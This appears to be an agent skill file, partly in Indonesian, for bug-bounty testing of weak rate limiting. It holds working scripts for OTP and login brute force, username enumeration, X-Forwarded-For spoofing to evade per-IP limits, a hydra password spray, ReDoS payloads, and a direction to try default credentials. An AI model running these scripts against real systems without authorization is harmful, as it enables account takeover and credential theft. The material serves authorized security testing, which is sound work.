---
name: hunt-brute-force
description: "Hunt Missing/Weak Rate Limiting — login brute force, OTP/2FA brute force (10^6 keyspace), password-reset-token brute, credential stuffing, username/email enumeration via error-string / status-code / timing differences, weak password policy, missing CAPTCHA (CAPTCHA token replay / single-use / concurrency-window bypass specifics → hunt-captcha-bypass), IP-based rate-limit bypass via X-Forwarded-For and friends, ReDoS. Distinguishes hard lockout vs soft IP-throttle vs CAPTCHA-injection vs silent shadow-throttling (avoids false-negative 'no rate limit' conclusions). Medium to Critical depending on what the brute reaches (OTP→ATO = Critical)."
sources: public_research
report_count: 6
---

> **Extra attack variants** (OpenEMR + PHP-core advisories — see §H): `skills/security/exploit-cookbook/references/openemr-php-advisory-techniques.md`


# HUNT-BRUTE-FORCE — Rate Limiting / Brute Force / Enumeration

> **Classify→bypass→proof matrix (4-state + edge-throttle + seed-test + bypass table + token-entropy):** `references/rate-limit-bypass-matrix.md` — biar sweep cepat tanpa baca 32 KB penuh. Kunci: seed test membedakan "no rate limit" vs shadow-throttle.

> Grounding note: this skill is built from published technique classes, not from a
> curated set of named HackerOne reports. `report_count` is intentionally `0` — do
> not cite an exact payout or report ID you cannot verify. Where a public case is
> well-documented (e.g. Laxman Muthiyah's Instagram password-reset OTP race/rotation
> research, 2019–2021), it is named below as a *technique reference*, not a payout claim.

## Crown Jewel Targets

OTP brute force (6-digit = 1,000,000 combinations) with no effective rate limit = Critical ATO bypass.

**Highest-value chains:**
- **OTP / 2FA brute → MFA bypass → ATO** — no effective rate limit on `/verify-otp`, full 000000–999999 keyspace reachable
- **Password-reset token brute** — short/predictable/non-expiring tokens + no rate limit → ATO (the Instagram 2019 case combined a 6-digit reset code, no rate limit per request-source, and IP rotation to make 10^6 tractable)
- **Username/email enumeration → targeted credential stuffing** — valid/invalid distinguishable by response string, status code, or timing, then sprayed with breach corpora
- **Coupon / gift-card / referral code brute** — no rate limit on code validation → financial impact
- **ReDoS** — attacker-controlled input hits a catastrophic-backtracking regex → CPU exhaustion → DoS

---

## Autonomous Testing Priority

**Work within your turn budget — prioritize signal over volume.**

You cannot brute-force millions of combinations in automated testing. Focus on two things: (1) credential spraying with the most likely candidates, and (2) detecting whether rate limiting exists at all.

**Strategy:**
1. Identify the login endpoint and the expected parameter names (username/email, password).
2. Try weak/default credentials likely for the target context — default admin credentials for the app's stack, simple passwords for test environments, credentials visible elsewhere on the app (e.g. usernames exposed in profiles, default passwords in documentation).
3. After 3-5 failed attempts, check for rate-limit signals (429 status, "too many attempts" message, CAPTCHA appearance, account lockout message). Absence of these = rate limiting is missing = vulnerability.
4. Use form-encoding for traditional login forms, JSON for REST API login endpoints.

**What to look for as success:**
- Session token or JWT in the response body or Set-Cookie header
- Redirect to authenticated dashboard
- Response body that differs from the failed-login baseline

**Username enumeration (separate finding):** Try a known-valid username vs a random one. If the error message differs ("Wrong password" vs "User not found") or response time differs → user enumeration vulnerability, even without a successful login.

---

## CRITICAL: Four rate-limit states — do not collapse them

A `200`/`401` with no `429` does **not** mean "no rate limiting". A rate-limiting
skill that only checks for `429`/lockout produces false negatives. Classify the
defense BEFORE concluding, by sending a burst of ~50 requests and watching the
*full* response (status, body, headers, latency, and downstream success):

| State | Signal | Brute still feasible? |
|-------|--------|-----------------------|
| **Hard account lockout** | account disabled after N fails; later *correct* creds also fail | No (but lockout itself can be a DoS finding) |
| **Soft IP throttle** | `429` / increasing latency keyed on source IP only | Yes — bypass via header/IP rotation (Phase 4) |
| **CAPTCHA injection** | `200` but body switches to a CAPTCHA challenge after N | Maybe — check if the verify endpoint enforces it server-side or if the API path skips it |
| **Silent shadow-throttle** | `200`/`401` returned for every request, but submissions are *dropped* — the genuinely-correct OTP/password stops being accepted, or responses become canned | **This is the trap.** A naive loop sees "all 200, no 429" and reports "no rate limit" — false. |
| **Edge / WAF throttle** | requests to the *host* begin returning `403` (often on GET) or `500` (often on POST) carrying an edge header (`x-azure-ref`, `cf-ray`, `x-amzn-RequestId`, `x-sucuri-id`) and **no** `Retry-After`; a sibling host on the same edge still answers normally | Temporarily no — and you can no longer mint fresh sessions, so this ends the engagement's auth testing |

**Shadow-throttle detector** — inject a known-good value at a known position and
confirm it still works under load:
```bash
# Seed: position 500 in the brute set is the REAL OTP for your own test account.
# If the loop reaches 500 and the correct code no longer authenticates,
# the endpoint is silently throttling/dropping — NOT unprotected.
KNOWN_GOOD="123456"   # the actual current OTP for YOUR test account
for n in $(seq 0 600); do
  CODE=$([ "$n" = "500" ] && echo "$KNOWN_GOOD" || printf "%06d" "$n")
  CODE_RESP=$(curl -s -o /tmp/bf_body -w "%{http_code} %{time_total}" \
    -X POST "https://$TARGET/api/verify-otp" \
    -H "Content-Type: application/json" -H "Cookie: $SESSION_COOKIE" \
    -d "{\"otp\":\"$CODE\"}")
  echo "$n $CODE $CODE_RESP $(wc -c </tmp/bf_body)"
done
# Three columns to watch: status, time_total, body size.
# Rising time_total or a body-size change with status unchanged = shadow throttle.
```

### Edge / WAF throttle — the 5th state, and why a short burst lies

**The false-negative that cost a whole finding.** 10 wrong passwords, then 15 more: every
response `200`, no `429`/`423`, no `Retry-After`, latency flat at ~0.28 s. That looks like a
textbook "no rate limiting" report. It was wrong. The control lived at the CDN/WAF and only
engaged after **~60 requests spanning several auth endpoints** from one IP:

```
GET  /Account/Login  -> 403   (body: "We could not complete your request, please try again
                               or contact support.", header: x-azure-ref: 2026...)
POST /Account/Login  -> 500
```
Same path on a sibling host behind the same edge (different FD profile) still returned `200`
→ the block is **host + source-IP scoped**, not a site outage.

**Discrimination probe — run this before writing or withdrawing a rate-limit finding:**
```bash
# 1. Is this path normally a 200? (a 403 on a page that renders = edge block, not app logic)
curl -s -o /dev/null -D - "https://$TARGET/Account/Login" -H "User-Agent: Mozilla/5.0" \
  | grep -iE "^HTTP|x-azure-ref|cf-ray|x-amzn|x-sucuri|^server:"
# 2. Same path on a SIBLING host on the same edge — block vs outage:
curl -s -o /dev/null -w "%{http_code}\n" "https://staging.$TARGET/Account/Login"
# 3. Confirm the app is still up while the endpoint is blocked:
curl -s -o /dev/null -w "%{http_code}\n" "https://$TARGET/"      # 302 still = app fine
```
An edge-ref header on a path that should render is conclusive: **the platform throttles.**
That is a *control*, and it demotes/withdraws a "no rate limit" finding — record it as
"high-threshold, non-standard-signal platform throttling (hardening note)", never as a vuln.

**Two consequences that must change your test order:**
- Ordering: **all authenticated / API / multi-account testing FIRST, auth-abuse LAST.** Once
  the edge blocks the auth host you cannot register, log in, or refresh sessions — the rest
  of the engagement is over. Pair this with short session TTLs (observed ~1 h) — a session
  you minted early will be dead by the time you get to the interesting API work.
- After the block, **correct credentials fail too.** Do not misrecord that as "account
  lockout", "code invalidated", or "shadow throttle" without the edge-header probe above —
  three different root causes, three different (non-)findings.

---

## Step-by-Step Hunting Methodology

### Phase 1 — Login Rate Limit Test (classify, don't just count 429s)
```bash
# Send a burst and log status + latency + body length for EACH attempt.
for i in $(seq 1 50); do
  read CODE TIME < <(curl -s -o /tmp/bf_l -w "%{http_code} %{time_total}\n" \
    -X POST "https://$TARGET/api/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"test@$TARGET\",\"password\":\"wrong$i\"}")
  echo "Attempt $i: status=$CODE time=${TIME}s len=$(wc -c </tmp/bf_l)"
  sleep 0.1
done
# Then CLASSIFY against the 4-state table above. Watch for:
#   - status flips to 429 / 403  → soft throttle or lockout
#   - body grows / CAPTCHA token appears → CAPTCHA injection
#   - latency climbs while status stays 401 → shadow throttle
#   - genuinely nothing changes across all 50 → candidate "no rate limit" (confirm w/ Phase 2 seed)
```

### Phase 2 — OTP / 2FA Brute Force
```bash
# PRE-REQUISITE: a valid session that is pending OTP verification (your own test account).
SESSION_COOKIE="pre-auth-session-after-first-factor"

# ---- 2a. PoC probe: send 101 codes (seq 0..100 is INCLUSIVE = 101 values) ----
# This ONLY proves the endpoint accepts repeated attempts without 429/lockout.
# It does NOT prove the full 10^6 keyspace is brute-forcible — see 2b.
for CODE in $(seq -f "%06g" 0 100); do
  RESP=$(curl -s -X POST "https://$TARGET/api/verify-otp" \
    -H "Content-Type: application/json" -H "Cookie: $SESSION_COOKIE" \
    -d "{\"otp\":\"$CODE\"}" -o /dev/null -w "%{http_code}")
  echo "$CODE: $RESP"
  [ "$RESP" = "429" ] && { echo "Rate limit at $CODE"; break; }
done
# 101 attempts with no 429/lockout → endpoint is a candidate. NOW run the shadow-throttle
# seed test (above) before claiming "no rate limit". A clean probe is necessary, not sufficient.

# ---- 2b. Full-keyspace impact proof (only with explicit authorization + your own account) ----
# Severity rests on 10^6 being REACHABLE, not on 101 codes. Demonstrate tractability:
#   - keyspace = 10^6 ; observed throughput from 2a (req/s) ; expected hit at ~half keyspace.
#   - e.g. 50 req/s sustained → ~10^6 / 50 ≈ 5.5 hours worst case, ~2.8h expected. That IS the impact.
#   - If a code rotates every T seconds, the real bound is (req/s * T) attempts per window.
#     Brute is only viable if (throughput * code_lifetime) approaches the keyspace, OR if the
#     code does NOT rotate / reset is unlimited (the Instagram-2019 class).
# Report the math; do NOT actually exhaust 10^6 against a third party.
```

### Phase 3 — Username / Email Enumeration (string AND status AND timing)
```bash
VALID_USER="known-user@$TARGET"
INVALID_USER="definitely-not-real-xyz123@$TARGET"

# String + status diff
for U in "$VALID_USER" "$INVALID_USER"; do
  curl -s -o /tmp/bf_e -w "[$U] status=%{http_code} time=%{time_total}s len=%{size_download}\n" \
    -X POST "https://$TARGET/api/login" -H "Content-Type: application/json" \
    -d "{\"email\":\"$U\",\"password\":\"wrongpassword\"}"
done
diff <(curl -s -X POST "https://$TARGET/api/login" -H 'Content-Type: application/json' \
        -d "{\"email\":\"$VALID_USER\",\"password\":\"wrong\"}") \
     <(curl -s -X POST "https://$TARGET/api/login" -H 'Content-Type: application/json' \
        -d "{\"email\":\"$INVALID_USER\",\"password\":\"wrong\"}")
# Different message/status/len → enumeration.

# Timing oracle (valid users hash the password, invalid users short-circuit → measurable delta).
# Sample MANY times and compare medians — a single request is noise, not signal.
echo "VALID timings:";   for i in $(seq 1 30); do curl -s -o /dev/null -w "%{time_total}\n" \
  -X POST "https://$TARGET/api/login" -H 'Content-Type: application/json' \
  -d "{\"email\":\"$VALID_USER\",\"password\":\"wrong\"}"; done | sort -n | awk '{a[NR]=$1}END{print a[int(NR/2)]}'
echo "INVALID timings:"; for i in $(seq 1 30); do curl -s -o /dev/null -w "%{time_total}\n" \
  -X POST "https://$TARGET/api/login" -H 'Content-Type: application/json' \
  -d "{\"email\":\"$INVALID_USER\",\"password\":\"wrong\"}"; done | sort -n | awk '{a[NR]=$1}END{print a[int(NR/2)]}'
# A reproducible median delta (e.g. valid ~180ms vs invalid ~40ms) is a timing-based enum finding.

# Reset + registration enumeration
curl -s -X POST "https://$TARGET/forgot-password" -d "email=$VALID_USER"   | grep -i "sent\|exist\|not found\|registered"
curl -s -X POST "https://$TARGET/forgot-password" -d "email=$INVALID_USER" | grep -i "sent\|exist\|not found\|registered"
curl -s -X POST "https://$TARGET/api/register"   -d "email=$VALID_USER"    | grep -i "exist\|taken\|already"
```

### Phase 3a — SIDE-CHANNEL endpoints that accept an email (the oracle nobody rate-limits)

Do not restrict enumeration testing to `/login` and `/forgot-password`. Almost every product has a
feature whose job is to "send something to an address", and each one is an enumeration oracle by
accident. Enumerate these first — they are usually weaker-defended than the auth endpoints:

`POST /referrals` (invite a friend) · `POST /org|team|workspace/invitations` · `POST /share`
("share with a Proton/user account") · alias/temp-mail creation · calendar attendee invite ·
gift/subscription transfer · `POST /users/register` (email-already-taken) ·
`GET /users/available` (username availability — usually *intended*, so weigh it separately).

Measured 2026-10-25 (Proton, `/api/core/v4/referrals`):

```
{"Recipients":["registered@proton.me"]}   -> 422 "<email> is already a Proton user."
{"Recipients":["random-xyz@gmail.com"]}   -> 200 (referral created) | 422 "…24 hours referral sending limit"
```
It also detected an account created with an **external** address (gmail), not just `@proton.me`.

**The pre-quota ordering defect — the variant that beats a rate limit.** This is the mirror image of
the throttle-artifact trap in *Validation* below. Two orderings of the same code produce opposite
verdicts, so you must determine **which check runs first**:

| Ordering | Under throttle | Verdict |
|---|---|---|
| quota → existence check | both answers become "limit reached" | oracle **evaporates**; throttle artifact, NOT enumeration |
| **existence check → quota** | registered still says "already a user", unregistered says "limit reached" | oracle **survives and becomes unlimited**; real finding |

Decision procedure (run it explicitly, don't infer):
1. Positive controls = **your own** registered addresses. Negative controls = synthetic non-existent.
2. Interleave valid/invalid from the first request (never all-valid then all-invalid).
3. **Deliberately exhaust the quota**, then re-run the pair.
4. If the registered address still returns the existence message while every unregistered one
   returns the quota message → the discriminator is evaluated **before** the limit ⇒ unlimited oracle.
   Report the ordering, not just the string difference: "the existence answer is not a side effect of
   sending, it is a free lookup" is what makes a reviewer take it seriously over "by design".

Also measure: burst without throttle (Proton: 10/10 fired, ~0.25 s apart, no 429) — a per-second
lookup rate is the impact argument, because it turns a leaked address list into a confirmed-user list.
Batch behaviour matters too: `{"Recipients":[a,b]}` stops at the first hit, so batching does **not**
speed up probing — say so, and do not claim a faster rate than you measured.

**Conduct:** positive controls only from your own accounts, negatives synthetic. Throttle tests reuse
your own address. Never enumerate a third party's address space — report the primitive, not a harvest.

Severity framing for a privacy-first vendor: membership disclosure about a service people chose for
anonymity is **Medium** ("sensitive data exposure"), not Low, even though no account content leaks.
State plainly what it is not: no content access, cannot reach a specific account.

### Phase 3b — Unthrottled registration (mass account creation)
An unrate-limited signup endpoint is an abuse finding on its own, not just an enumeration oracle: burst `*/signup`/`*/register` (rotate email + source per request) and confirm N accounts are actually created with no 429/CAPTCHA/lockout → automated mass-account creation (spam, promo/referral abuse, resource exhaustion). Low–Medium standalone; higher when it chains to a paid/limited resource. Disclosed: reports/2915502.

### Phase 3c — Invite / referral / coupon CODE-VALIDATION endpoint (the honest version)

Same class as login brute, but the severity argument is keyspace × throttle, and the discipline is:
**never guess at real codes — random strings only**, and label the burst as a *rate-limit test*.

```bash
# 1) Read the keyspace off the UI, not off your imagination (devtools / CDP evaluate):
#    [...document.querySelectorAll('input')].map(i=>({ph:i.placeholder,max:i.maxLength,pattern:i.pattern}))
#    e.g. max=6 + pattern ^[a-zA-Z0-9]+$  -> 62^6 ~= 5.7e10  (state that maths in the report)
# 2) Uniform-response check: does a *valid* code even change the answer? Try only obviously-invalid
#    and empty input; if every miss returns the same status+body, there is NO oracle:
for CODE in AAAAAA AAAAAB VANA ""; do
  curl -s -o /tmp/r -w "$CODE -> %{http_code} %{time_total}s len=%{size_download}\n" \
    -H "Referer: https://$TARGET/referral-code" "https://$TARGET/api/invite/validate?code=$CODE"
  cat /tmp/r; echo
done
# 3) Bounded throttle probe: 30 requests at 1 rps, then a 10-request burst in a few seconds.
#    Record status set, median latency, and any 429/503/Retry-After for BOTH phases.
```

Verdict vocabulary for this endpoint class:
- **Uniform negative response** ⇒ *no validity oracle*. Say so — it is a design strength, and it means the
  only remaining angle is the absence of throttling.
- **No 429/503 and flat latency across 40 gentle requests** ⇒ *no rate limiting observed*. That is a
  **Low / hardening** item, never Medium: you have not demonstrated a valid code, so impact rests on
  62^6 ≈ 5.7e10, whether live codes are numerous (users share them, so a real fraction of the space may
  be live), and feasibility of distributed guessing. Report it as: keyspace + observed throughput +
  explicitly what you did NOT do (no code found, no enumeration performed, no oracle).
- **A 429 or a latency climb** ⇒ you found the control; classify it against the 5-state table above and
  do not report a missing limit.

### Phase 4 — IP / Source Rotation Bypass
```bash
# Per-IP limits are bypassable when the app trusts a client-controlled source header.
# Rotate the header EVERY request; if the 429 you hit in Phase 1 disappears → broken limit.
HEADERS=( "X-Forwarded-For" "X-Real-IP" "X-Originating-IP" "X-Client-IP" \
          "X-Remote-IP" "X-Forwarded" "Forwarded-For" "CF-Connecting-IP" "True-Client-IP" )
for i in $(seq 1 60); do
  RAND_IP="$(shuf -i 1-254 -n1).$(shuf -i 1-254 -n1).$(shuf -i 1-254 -n1).$(shuf -i 1-254 -n1)"
  ARGS=(); for h in "${HEADERS[@]}"; do ARGS+=(-H "$h: $RAND_IP"); done
  RESP=$(curl -s "${ARGS[@]}" -X POST "https://$TARGET/api/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"test@$TARGET\",\"password\":\"wrong$i\"}" -o /dev/null -w "%{http_code}")
  echo "Attempt $i (IP $RAND_IP): $RESP"
done
# Also try: multiple comma-joined XFF values ("1.2.3.4, 5.6.7.8"), and appending your real IP
# AFTER a spoofed one — some parsers take first, some last.
# CONFIRM the bypass: re-run Phase 1 WITHOUT rotation to show the 429 returns. The delta is the proof.
```

### Phase 5 — Token Entropy (measure it, don't eyeball it)
```bash
# Collect reset/session/OTP tokens for YOUR OWN test account, then quantify entropy.
for i in $(seq 1 20); do
  curl -s -X POST "https://$TARGET/forgot-password" -d "email=your-test@email.com"
  # Extract token from the email/link and append to tokens.txt
  sleep 2
done

# 1) Shannon entropy / compressibility — low entropy = predictable:
ent tokens.txt 2>/dev/null || \
  python3 -c "import sys,math,collections;d=open('tokens.txt').read();c=collections.Counter(d);n=len(d);\
print('bits/char =', -sum(v/n*math.log2(v/n) for v in c.values()))"

# 2) If tokens are hex/base64, decode and look for structure (timestamp, counter, PID):
while read t; do echo -n "$t -> "; echo -n "$t" | xxd -r -p 2>/dev/null | xxd | head -1; done < tokens.txt

# 3) Sequential / time-correlated test — sort and diff consecutive numeric tokens:
sort -n tokens.txt | awk 'NR>1{print $1-prev} {prev=$1}'   # constant/small delta = counter-based

# 4) DEFINITIVE tool: pipe ~10k tokens through Burp Sequencer (Live capture on the reset
#    response) — it runs FIPS/NIST randomness tests and reports effective bits of entropy.
#    < ~64 effective bits on a security token is a finding; the brute-window math follows.
```

### Phase 6 — ReDoS Detection
```bash
# Hit input-validation / search endpoints with catastrophic-backtracking payloads.
# Classic evil-regex triggers (nested quantifier / overlapping alternation):
for LEN in 5 10 15 20 25 30; do
  INPUT=$(python3 -c "print('a'*$LEN + '!')")              # for (a+)+$  /  (a|a)*$ style regex
  T=$(curl -s -o /dev/null -w "%{time_total}" "https://$TARGET/search?q=$INPUT")
  echo "len=$LEN -> ${T}s"
done
# Other payload shapes to try by field: email regex → "a@"+"a"*N ; URL regex → "http://"+"a"*N
# DOUBLING latency per +5 chars (super-linear) = ReDoS. Linear growth = just a slow endpoint, NOT a bug.
# Confirm with a control: send the same byte-length of a BENIGN string; if it returns fast, the
# blow-up is regex-driven, not size-driven.
```

---

## Automation
```bash
# ---- ffuf: OTP brute ----
# PoC probe (101 codes) — proves acceptance, NOT full keyspace. Note the inclusive seq.
ffuf -u "https://$TARGET/api/verify-otp" -X POST \
  -H "Content-Type: application/json" -H "Cookie: session=SESSION" \
  -d '{"otp": "FUZZ"}' \
  -w <(seq -f "%06g" 0 100) \
  -mc all -ac \
  -rate 50            # cap throughput so YOU can read the rate-limit response, not DoS the target

# FULL keyspace (authorized + your own account only) — generate all 10^6 codes:
#   seq -f "%06g" 0 999999 > /tmp/otp_full.txt   (then -w /tmp/otp_full.txt)
# Use -mc all + -ac so ffuf auto-calibrates and you SEE 429/403/CAPTCHA responses instead of
# filtering them out. -mc 200 alone hides throttling — never brute with -mc 200 only.
# Add -p 0.1 jitter and watch the Errors/RateLimited counters; stop if the success oracle stops firing.

# ---- hydra: login spray ----
hydra -l admin@target.com -P ~/wordlists/top-1000.txt "$TARGET" \
  http-post-form "/api/login:email=^USER^&password=^PASS^:Invalid" -t 4

# ---- nuclei: rate-limit / default-cred templates ----
nuclei -u "https://$TARGET" -t http/fuzzing/ -t http/default-logins/ -severity medium,high,critical
```

---

## Chain Table

| Finding | Chain to | Impact |
|---------|----------|--------|
| No effective rate limit on OTP (full 10^6 reachable) | MFA bypass → ATO | Critical |
| Password-reset code brute + IP rotation | Reset → ATO (Instagram-2019 class) | Critical |
| No rate limit on login + enumeration | Credential stuffing with breach corpus | High |
| IP bypass via X-Forwarded-For et al. | Every per-IP limit on the app defeated | High |
| Predictable / low-entropy reset token | Token guess within validity window → ATO | High |
| ReDoS on a public input field | Single-request CPU exhaustion → DoS | Medium–High |
| Hard lockout triggerable by attacker | Targeted account DoS (lock victim out) | Medium |
| No throttle on invite / referral / coupon validation (uniform response) | Invite-gate / discount bypass IF codes are low-entropy or widely shared | Low (hardening) — Medium when codes are demonstrably few/short |

---

## Validation — false-positive discipline

Before writing the report, each must hold:

- **OTP/login "no rate limit"**: confirmed against ALL FOUR states — not just absence of `429`.
  Shadow-throttle seed test passed (the known-good value still authenticates under burst load).
  Latency and body-size were monitored, not only status code.
- **Full-keyspace claim**: severity is justified by the *reachability math* (throughput × code-lifetime
  vs 10^6), not by a 101-code probe. State the numbers in the report.
- **Enumeration**: difference is reproducible across ≥20 samples and is a *server-state* difference
  (valid vs invalid user), not a server-policy artifact (e.g. a generic "if this email exists we sent…"
  message is NOT enumeration). For timing, compare medians of many samples, never single requests.
  **Throttle-artifact trap (seen live):** `/forgot-password` returned `302 → /ForgotPasswordConfirmation`
  for a registered address and `200` (inline confirmation page) for an unregistered one — a clean-looking
  oracle. Repeated, the SAME registered address returned `200` from the third request onward, and after a
  cooldown **every** address (registered or not) returned `200` with an identical body. The real rule was
  "dispatch a reset mail → redirect; otherwise render the page", gated by a per-IP quota — i.e. the
  oracle evaporates once throttled and is **not** user enumeration. Protocol: interleave
  valid/invalid (don't run all-valid then all-invalid), re-test after a cooldown, and never conclude
  from the first two requests. A difference that exists only in the opening requests is a throttle
  artifact, not an oracle.
  **The inverse, and it is a stronger finding:** if the two answers *diverge further* once the quota is
  spent — registered still "already a user", unregistered "limit reached" — the existence check is
  evaluated **before** the rate limit, so the oracle is unlimited. Deliberately exhausting the quota
  and re-running the interleaved pair is therefore a required step, not an optional one; it is what
  tells the two orderings apart (see Phase 3a).
- **IP-rotation bypass**: proven by toggling rotation off and showing the `429` returns. The delta IS
  the proof; one fast run alone is not.
- **Token entropy**: backed by an actual measurement (Burp Sequencer effective-bits, `ent`, or a
  demonstrated counter/timestamp structure), not "looks short".
- **ReDoS**: super-linear (doubling) latency growth with a benign-control comparison; linear ≠ ReDoS.
- **Invite/referral/coupon validation with no throttle**: report only what you measured — the keyspace read
  off the UI (`maxlength` + `pattern`), the probe shape (N gentle + a burst), the uniform negative response
  (no oracle), and the absence of 429/`Retry-After`. Severity stays Low/hardening unless you can show the
  code space is small or that live codes are numerous. Never claim a bypass you did not perform, and never
  guess at real codes to "confirm" it.
- **Scope/impact**: did you reach a real outcome (authenticated session, leaked account list, DoS)?
  A rate-limit gap with no reachable impact is informational, not Medium.

**Severity:**
- Effective brute of OTP/MFA/reset-code → demonstrated ATO path: **Critical**
- No login rate limit + working credential-stuffing/IP-bypass: **High**
- Predictable security token (measured low entropy): **High**
- Username/email enumeration alone: **Low–Medium**
- ReDoS with reproducible meaningful server lag: **Medium–High**
- Attacker-triggerable hard lockout (account DoS): **Medium**

## Minimum 5 probes (wajib sebelum kelas ini boleh N/A)

| # | Probe | Kenapa ini dulu |
|---|---|---|
| 1 | Login tanpa rate limit: 20 request gagal berturut, ukur ada lockout/429? | Primordial — tanpa ini semua brute mungkin |
| 2 | OTP/reset code: ukur ruang (4 digit? 6?) + cek ada attempt counter | Ruang kecil + tanpa limit = takeover |
| 3 | Response diff: username valid vs invalid (status, panjang body, waktu) | User enumeration mengarahkan brute |
| 4 | Rate limit per-IP vs per-akun: rotasi `X-Forwarded-For` / ganti endpoint | Limit per-IP mudah dilewati |
| 5 | Password reset token: brute token kalau entropy rendah & tak ada limit | Reset brute = ATO tanpa kredensial |

**Aturan:** kalau salah satu probe belum dijalankan, kelas ini **belum boleh** ditulis
N/A. N/A harus menyebut probe mana yang sudah dicoba dan hasilnya.

## Gate 0 Validation

1. **Apa yang bisa dilakukan penyerang SEKARANG?** "Penyerang bisa menebak 6 digit OTP korban dalam X menit karena tidak ada rate limit" — tunjukkan percobaan yang berhasil pada akun B yang kamu kuasai.
2. **Apa yang hilang dari korban?** Biasanya akses akun (kerahasiaan + integritas). Sebutkan data atau aksi spesifik yang bisa diambil.
3. **Bisa direproduksi 10 menit dari nol?** Sertakan jumlah percobaan, waktu, dan bukti keberhasilan pada akun uji. Tanpa keberhasilan nyata = bukan temuan.

## Eskalasi wajib (jangan berhenti di kelas ini)

**Primitif:** tebak kredensial/token

**Teknik pengembangan:** spray lintas akun; OTP brute; token entropy rendah

**Eskalasi ke:** `hunt-ato`

**Depth target:** L2 -> L4

Satu temuan di kelas ini WAJIB menyebut eskalasi berikutnya (atau alasan primitif habis).
Lihat `exploit-chain-graph` + `exploit-depth` (L0-L5). `depth_gate.py` memblokir temuan
yang buktinya cuma status code.

## 2026 sweep (dork pass 2026-10-26 — advisori terverifikasi)

- **CVE-2026-11103 — GraphQL Batching Alias Rate Limit Bypass.** Alias + batching membuat banyak operasi dalam satu request HTTP, melewati rate limit per-request.
  Lesson: **rate limit per HTTP request tidak berarti apa-apa di GraphQL.** Kalau target punya GraphQL dan rate limit, uji apakah itu per-operasi atau per-request.
- **CVE-2026-34368 — AVideo YPTWallet: TOCTOU race + captcha token reuse.** Token captcha bisa dipakai ulang.
  Lesson: **captcha reuse mematikan proteksi anti-automasi** pada endpoint uang — dan itu temuan tersendiri yang menguatkan brute-force, bukan cuma prasyarat.
- **CVE-2026-41940 — cPanel/WHM: session-file CRLF dengan field sesi palsu.** Bukan brute-force, tapi contoh endpoint pra-auth tanpa rate limit yang dieksploitasi di dunia nyata.
  Lesson: endpoint pra-auth pada appliance sering tidak punya rate limit karena berada di balik VPN "tepercaya" — asumsi yang bisa dipatahkan.

**Probe inti:** login tanpa rate limit (20 request gagal berturut), OTP/reset code (ukur ruang + attempt counter), response diff (username valid vs invalid), rate limit per-IP vs per-akun (rotasi `X-Forwarded-For`), dan brute reset token kalau entropy rendah.


## Critical severity anchor (kelas ini bisa Critical — syaratnya)

Critical hanya kalau rate limit adalah SATU-SATUNYA kontrol di depan aksi bernilai (login admin, OTP, reset token). Kalibrasi: endpoint di belakang punya rate limit independen = bypass hanya menurunkan friksi; account enumeration = sering di-de-scope, jangan jadi temuan utama.
